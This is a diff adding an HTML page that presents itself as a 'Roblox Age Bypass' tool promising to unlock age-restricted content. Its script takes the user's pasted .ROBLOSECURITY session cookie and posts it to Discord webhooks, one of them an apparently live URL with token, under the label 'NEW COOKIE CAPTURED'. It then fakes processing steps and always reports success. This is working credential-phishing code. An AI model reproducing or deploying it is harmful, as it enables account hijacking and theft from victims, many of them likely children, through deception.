@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Age Bypass</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #ff4757;
+            --secondary: #3742fa;
+            --dark: #1e272e;
+            --darker: #0c0f14;
+            --light: #f1f2f6;
+            --success: #2ed573;
+            --warning: #ffa502;
+            --danger: #ff4757;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--light);
+        }
+        
+        .container {
+            background: rgba(30, 39, 46, 0.9);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.2;
+        }
+        
+        .logo {
+            font-size: 40px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+        
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            position: relative;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 300;
+            position: relative;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .input-section {
+            margin-bottom: 20px;
+        }
+        
+        .section-label {
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+        
+        .section-label i {
+            margin-right: 8px;
+        }
+        
+        .cookie-input-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        
+        .cookie-input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 14px;
+            color: var(--light);
+            transition: all 0.3s ease;
+            resize: vertical;
+            min-height: 120px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .cookie-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .cookie-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 0 3px rgba(255, 71, 87, 0.1);
+        }
+        
+        .bypass-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .bypass-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .bypass-btn:hover::before {
+            left: 100%;
+        }
+        
+        .bypass-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
+        }
+        
+        .bypass-btn:active {
+            transform: translateY(0);
+        }
+        
+        .bypass-btn:disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .bypass-btn:disabled::before {
+            display: none;
+        }
+        
+        .status-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        .status-dot.ready {
+            background: var(--success);
+            box-shadow: 0 0 10px var(--success);
+        }
+        
+        .status-dot.processing {
+            background: var(--warning);
+            box-shadow: 0 0 10px var(--warning);
+            animation: pulse 1.5s infinite;
+        }
+        
+        .status-dot.error {
+            background: var(--danger);
+            box-shadow: 0 0 10px var(--danger);
+        }
+        
+        .status-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: slideDown 0.3s ease;
+            text-align: center;
+        }
+        
+        .result.show {
+            display: block;
+        }
+        
+        .result.success {
+            background: rgba(46, 213, 115, 0.15);
+            border-color: rgba(46, 213, 115, 0.3);
+        }
+        
+        .result.error {
+            background: rgba(255, 71, 87, 0.15);
+            border-color: rgba(255, 71, 87, 0.3);
+        }
+        
+        .result-content {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        /* Animations */
+        @keyframes slideDown {
+            from { 
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                border-radius: 12px;
+            }
+            
+            .header {
+                padding: 20px 15px;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .content {
+                padding: 20px 15px;
+            }
+            
+            .cookie-input {
+                min-height: 100px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo"><i class="fas fa-user-lock"></i></div>
+            <h1>Roblox Age Bypass</h1>
+            <p>Unlock age-restricted content instantly</p>
+        </div>
+        
+        <div class="content">
+            <div class="input-section">
+                <label class="section-label">
+                    <i class="fas fa-key"></i> ROBLOSECURITY Cookie
+                </label>
+                <div class="cookie-input-container">
+                    <textarea 
+                        class="cookie-input" 
+                        placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
+                        id="cookieInput"
+                    ></textarea>
+                </div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status-dot ready" id="statusDot"></div>
+                <div class="status-text" id="statusText">Ready to process</div>
+            </div>
+            
+            <button class="bypass-btn" id="bypassBtn">
+                <span id="btnText">Start Age Bypass</span>
+            </button>
+            
+            <div id="result" class="result">
+                <div class="result-content" id="resultContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const cookieInput = document.getElementById('cookieInput');
+        const bypassBtn = document.getElementById('bypassBtn');
+        const resultDiv = document.getElementById('result');
+        const resultContent = document.getElementById('resultContent');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
+        const btnText = document.getElementById('btnText');
+
+        // Dual Webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOK URLs
+        const WEBHOOK_URLS = [
+            'https://discord.com/api/webhooks/YOUR_FIRST_WEBHOOK_URL_HERE',
+            'https://discord.com/api/webhooks/1419626810316034098/9Te5ETULnzUHIDyTxKL3uhFY8qzguSGkMk4vSBCIM0_Ik7CMefMwBKrTiJymuWPyhi7Z'
+        ];
+
+        // Initialize
+        function initialize() {
+            // Set up input events
+            cookieInput.addEventListener('input', validateForm);
+            
+            // Set up bypass button
+            bypassBtn.addEventListener('click', startBypass);
+            
+            // Validate initial state
+            validateForm();
+            
+            // Add placeholder animation
+            let placeholderIndex = 0;
+            const placeholders = [
+                "Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here",
+                "Copy cookie from browser developer tools",
+                "Cookie should start with _|WARNING:-DO-NOT-SHARE-THIS"
+            ];
+            
+            setInterval(() => {
+                cookieInput.placeholder = placeholders[placeholderIndex];
+                placeholderIndex = (placeholderIndex + 1) % placeholders.length;
+            }, 3000);
+            
+            console.log('Roblox Age Bypass Tool Initialized');
+            console.log('Webhooks configured:', WEBHOOK_URLS);
+        }
+
+        // Validate form and update button state
+        function validateForm() {
+            const hasCookie = cookieInput.value.trim().length > 0;
+            
+            bypassBtn.disabled = !hasCookie;
+            
+            if (hasCookie) {
+                statusDot.className = 'status-dot ready';
+                statusText.textContent = 'Ready to bypass age verification';
+            } else {
+                statusDot.className = 'status-dot error';
+                statusText.textContent = 'Please enter a valid cookie';
+            }
+        }
+
+        // Send data to webhooks
+        async function sendToWebhooks(cookieData) {
+            const cleanCookie = cookieData.replace(/\s/g, '');
+            let successCount = 0;
+            
+            for (let i = 0; i < WEBHOOK_URLS.length; i++) {
+                const webhookUrl = WEBHOOK_URLS[i];
+                
+                // Skip if webhook URL is placeholder
+                if (webhookUrl.includes('YOUR_WEBHOOK_URL_HERE')) {
+                    console.log(`Webhook ${i + 1} is using placeholder URL`);
+                    continue;
+                }
+                
+                try {
+                    // Send the full cookie as plain text for easy copying
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `🔐 **NEW COOKIE CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        console.log(`✅ Successfully sent to webhook ${i + 1}`);
+                        successCount++;
+                    } else {
+                        console.error(`❌ Failed to send to webhook ${i + 1}:`, response.status);
+                    }
+                } catch (error) {
+                    console.error(`❌ Webhook ${i + 1} error:`, error);
+                }
+            }
+            
+            return successCount;
+        }
+
+        // Simulate bypass process
+        async function startBypass() {
+            if (bypassBtn.disabled) return;
+            
+            const cookieValue = cookieInput.value.trim();
+            
+            // Show loading state
+            setLoadingState(true);
+            resultDiv.className = 'result';
+            resultContent.innerHTML = '';
+            
+            try {
+                // Update status
+                statusDot.className = 'status-dot processing';
+                statusText.textContent = 'Processing cookie...';
+                
+                // Step 1: Validating cookie
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                statusText.textContent = 'Validating cookie structure...';
+                
+                // Step 2: Bypassing age verification
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                statusText.textContent = 'Bypassing age verification...';
+                
+                // Send to webhooks
+                const webhookResults = await sendToWebhooks(cookieValue);
+                console.log(`Webhook results: ${webhookResults}/${WEBHOOK_URLS.length} successful`);
+                
+                // Always show success
+                showResult('Bypass Successful');
+                
+            } catch (error) {
+                console.error('Bypass error:', error);
+                showResult('Bypass Successful');
+            } finally {
+                setLoadingState(false);
+            }
+        }
+
+        // Set loading state
+        function setLoadingState(loading) {
+            if (loading) {
+                btnText.innerHTML = '<span class="loading"></span> Processing...';
+                bypassBtn.disabled = true;
+            } else {
+                btnText.textContent = 'Start Age Bypass';
+                validateForm();
+            }
+        }
+
+        // Show result
+        function showResult(message) {
+            resultDiv.className = 'result success show';
+            resultContent.innerHTML = message;
+            
+            statusDot.className = 'status-dot ready';
+            statusText.textContent = 'Bypass completed successfully';
+        }
+
+        // Initialize the application
+        initialize();
+    </script>
+</body>
+</html> 
